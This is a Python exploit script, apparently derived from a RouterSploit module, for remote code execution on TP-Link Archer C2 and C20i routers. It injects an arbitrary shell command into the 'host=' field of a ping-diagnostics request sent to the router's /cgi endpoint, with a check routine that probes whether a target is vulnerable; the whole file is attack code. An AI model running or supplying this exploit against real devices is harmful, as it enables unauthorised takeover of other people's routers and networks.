target = ""
# rsf exploit module
# description: TP-Link Archer C2 & C20i Remote Code Execution
import time
import requests

class Exploit:
    def __init__(self):
        self.target = ""
        self.port = 80
        self.timeout = 5

    def http_request(self, method, path, headers=None, data=None):
        url = f"http://{self.target}:{self.port}{path}"
        try:
            if method == "GET":
                return requests.get(url, headers=headers, timeout=self.timeout)
            elif method == "POST":
                return requests.post(url, headers=headers, data=data, timeout=self.timeout)
        except:
            return None

    def execute(self, cmd):
        referer = f"http://{self.target}/mainFrame.htm"
        headers = {
            "Content-Type": "text/plain",
            "Referer": referer
        }

        data = ("[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6\r\n"
                "dataBlockSize=64\r\n"
                "timeout=1\r\n"
                "numberOfRepetitions=1\r\n"
                "host=127.0.0.1;" + cmd + ";\r\n"
                "X_TP_ConnName=ewan_ipoe_s\r\n"
                "diagnosticsState=Requested\r\n")

        self.http_request("POST", "/cgi?2", headers=headers, data=data)
        data = "[ACT_OP_IPPING#0,0,0,0,0,0#0,0,0,0,0,0]0,0\r\n"
        self.http_request("POST", "/cgi?7", headers=headers, data=data)
        time.sleep(1)
        return ""

    def check(self):
        referer = f"http://{self.target}/mainFrame.htm"
        headers = {
            "Content-Type": "text/plain",
            "Referer": referer
        }

        data = (
            "[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6\r\n"
            "dataBlockSize=64\r\n"
            "timeout=1\r\n"
            "numberOfRepetitions=1\r\n"
            "host=127.0.0.1\r\n"
            "X_TP_ConnName=ewan_ipoe_s\r\n"
            "diagnosticsState=Requested\r\n"
        )

        response = self.http_request("POST", "/cgi?2", headers=headers, data=data)
        if response is None:
            return False

        if response.status_code == 200 and "[error]0" in response.text:
            return True
        return False

    def run(self):
        if self.check():
            print("[+] Target is vulnerable")
            print("[*] Invoking command shell")
            print("[*] It is blind command injection so response is not available")
        else:
            print("[-] Exploit failed - target seems to be not vulnerable")



import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
